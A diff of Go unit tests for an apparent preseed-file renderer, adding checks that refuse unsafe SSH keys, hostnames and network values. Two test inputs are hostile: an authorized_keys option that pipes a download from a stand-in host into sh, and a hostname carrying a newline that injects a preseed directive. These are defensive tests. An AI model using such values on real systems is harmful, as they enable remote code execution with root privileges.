@@ -137,11 +137,6 @@ func TestRenderPreseedRefusesAValueTooLongToBeAKey(t *testing.T) {
 	if _, err := RenderPreseed(s); err == nil {
 		t.Fatal("a 1100-character value was accepted")
 	}
-	empty := goodSpec()
-	empty.SSHPublicKey = "   "
-	if _, err := RenderPreseed(empty); err == nil {
-		t.Fatal("an empty key was accepted")
-	}
 }
 
 func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
@@ -149,6 +144,20 @@ func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
 	s.SSHPublicKey = "hunter2"
 	if _, err := RenderPreseed(s); err == nil {
 		t.Fatal("want error for a non-key, got nil")
+	}
+}
+
+// The options prefix is "something else in the value" that ParseAuthorizedKey
+// accepts without complaint -- measured: command="curl .. |sh",no-pty parses
+// cleanly, and the double quotes inside it are inert in the single-quoted
+// echo that writes this file, so the metacharacter check never sees it. If
+// this key were accepted, the command would run as Frame's own login,
+// "frame", who has NOPASSWD:ALL.
+func TestRenderPreseedRefusesAKeyWithAuthorizedKeysOptions(t *testing.T) {
+	s := goodSpec()
+	s.SSHPublicKey = `command="curl http://evil/x|sh",no-pty ` + s.SSHPublicKey
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for a key carrying authorized_keys options, got nil")
 	}
 }
 
@@ -179,6 +188,13 @@ func TestRenderPreseedAssertsDiskSizeBeforePartitioning(t *testing.T) {
 	if !strings.Contains(got, "preseed/early_command") {
 		t.Error("the assertion must run before partman, in early_command")
 	}
+	// Whether a non-zero early_command aborts the install could not be
+	// verified here, so the assertion does not depend on it: on a mismatch it
+	// powers the machine off directly. An untouched, powered-off machine is a
+	// safe failure.
+	if !strings.Contains(got, "poweroff -f") {
+		t.Error("on a size mismatch the machine must power off, not rely on early_command's exit-code semantics")
+	}
 }
 
 func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
@@ -186,5 +202,93 @@ func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
 	s.UID = ""
 	if _, err := RenderPreseed(s); err == nil {
 		t.Fatal("want error for empty UID, got nil")
+	}
+}
+
+func TestRenderPreseedRejectsAnEmptyHostname(t *testing.T) {
+	s := goodSpec()
+	s.Hostname = ""
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for empty hostname, got nil")
+	}
+}
+
+func TestRenderPreseedRejectsAMalformedNetworkAddress(t *testing.T) {
+	s := goodSpec()
+	s.Network.Address = "not-a-cidr"
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for a malformed network address, got nil")
+	}
+}
+
+// A CIDR is not the same shape as an IP address. net.ParseCIDR happily
+// accepts an IPv6 range, and rendering its mask as a dotted quad produces
+// nonsense like "ffff:ffff:ffff:ffff::" for netcfg/get_netmask.
+func TestRenderPreseedRejectsANonIPv4Address(t *testing.T) {
+	s := goodSpec()
+	s.Network.Address = "2001:db8::1/64"
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for a non-IPv4 network address, got nil")
+	}
+}
+
+func TestRenderPreseedRejectsAMalformedGateway(t *testing.T) {
+	s := goodSpec()
+	s.Network.Gateway = "not-an-ip"
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for a malformed gateway, got nil")
+	}
+}
+
+// checkPreseedValue is one function shared by every field that reaches the
+// template (UID, Hostname, DNS, Network.Address, Network.Gateway, Layout.Raw,
+// Disk.ByID) rather than a guard per field -- a guard per field is exactly
+// what failed for four rounds on SSHPublicKey while these fields, reaching
+// the same two contexts, had none. Hostname stands in for all of them here:
+// the function does not vary by call site, so one covering test per branch is
+// enough to mutation-prove the shared code, not one per field.
+func TestRenderPreseedRefusesAHostnameContainingANewline(t *testing.T) {
+	s := goodSpec()
+	s.Hostname = "g9\nd-i partman/confirm boolean true"
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for a hostname containing a newline, got nil")
+	}
+}
+
+// The newline branch is not what closes the hole for this field: \n and \r
+// are themselves control characters (0x0A and 0x0D), so the control-character
+// loop below already refuses them -- measured, disabling the newline branch
+// alone does not turn TestRenderPreseedRefusesAHostnameContainingANewline red.
+// It earns its place the same way the PRIVATE KEY branch in
+// checkPublicKeyOnly does: for what it says. "starts a new directive, which
+// runs as root" is far more specific than "must not contain control
+// characters", so this asserts the message rather than merely the error.
+func TestRenderPreseedNamesTheNewlineWhenAValueBreaksADirective(t *testing.T) {
+	s := goodSpec()
+	s.Hostname = "g9\nd-i partman/confirm boolean true"
+	_, err := RenderPreseed(s)
+	if err == nil {
+		t.Fatal("want an error, got nil")
+	}
+	if !strings.Contains(err.Error(), "starts a new directive") {
+		t.Errorf("error = %q; it must name the problem, not just refuse", err)
+	}
+}
+
+func TestRenderPreseedRefusesAHostnameContainingAQuoteOrBackslash(t *testing.T) {
+	for _, h := range []string{"g9'", `g9\`} {
+		s := goodSpec()
+		s.Hostname = h
+		if _, err := RenderPreseed(s); err == nil {
+			t.Errorf("hostname %q was accepted; it breaks out of the shell quoting elsewhere in the preseed", h)
+		}
+	}
+}
+
+func TestRenderPreseedRefusesAHostnameContainingControlCharacters(t *testing.T) {
+	s := goodSpec()
+	s.Hostname = "g9\x00"
+	if _, err := RenderPreseed(s); err == nil {
+		t.Fatal("want error for a hostname containing a control character, got nil")
 	}
 }
